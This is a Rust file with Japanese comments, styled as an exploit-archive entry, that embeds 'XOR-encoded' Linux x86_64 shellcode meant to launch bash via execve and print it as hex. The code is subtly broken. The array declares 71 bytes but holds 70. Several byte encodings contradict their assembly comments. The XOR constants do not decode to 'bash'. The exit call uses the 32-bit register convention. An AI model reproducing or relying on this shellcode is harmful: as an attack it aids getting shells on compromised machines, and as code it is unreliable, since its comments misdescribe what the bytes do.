// エクスプロイトのタイトル: Linux/x86_64 - XOR エンコードされた Bash シェルコード
// 日付: 2022年2月18日
// エクスプロイトの作成者: @raheel0x01
// カテゴリ: Shellcode
// アーキテクチャ: Linux x86_64
// シェルコードの長さ: 71 Bytes

fn main() {
    let shellcode: [u8; 71] = [
      
        // execve() のための argv と envp 配列のセットアップ
        0x48, 0x31, 0xC0,                           // xor rax, rax
        0x48, 0x89, 0x44, 0x24, 0xF8,              // mov [rsp-8], rax
        0x48, 0xC7, 0x44, 0x24, 0xF0, 0x62, 0x31, 0x61, 0x72, // mov qword [rsp-16], 0x72613162 ; 暗号化された 'bash'
        0x80, 0x34, 0x24, 0x08,                    // xor byte [rsp-16], 0x08
        0x80, 0x74, 0x24, 0x0D, 0x16,              // xor byte [rsp-15], 0x16
        0x80, 0x74, 0x24, 0x0E, 0x24,              // xor byte [rsp-14], 0x24
        0x80, 0x74, 0x24, 0x0F, 0x32,              // xor byte [rsp-13], 0x32
        0x48, 0x8D, 0x54, 0x24, 0xF0,              // lea rdx, [rsp-16]
        0x48, 0x89, 0x54, 0x24, 0xE8,              // mov qword [rsp-24], rdx
        0x48, 0x89, 0x54, 0x24, 0xD0,              // mov qword [rsp-32], rdx
        0x48, 0x8D, 0x7C, 0x24, 0xD0,              // lea rdi, [rsp-32]

        // execve() を呼び出す
        0x31, 0xC0,                                 // xor eax, eax
        0xB0, 0x3B,                                 // mov al, 59
        0x0F, 0x05,                                 // syscall

        // ステータスコード 0 で終了する
        0x31, 0xC0,                                 // xor eax, eax
        0x89, 0xC3,                                 // mov ebx, eax
        0xB0, 0x3C,                                 // mov al, 60
        0x0F, 0x05,                                 // syscall
    ];

    // Convert the shellcode to a string to print it out
    let shellcode_str = shellcode.iter().map(|&byte| format!("{:02X}", byte)).collect::<String>();
    println!("Shellcode:\n{}", shellcode_str);
}
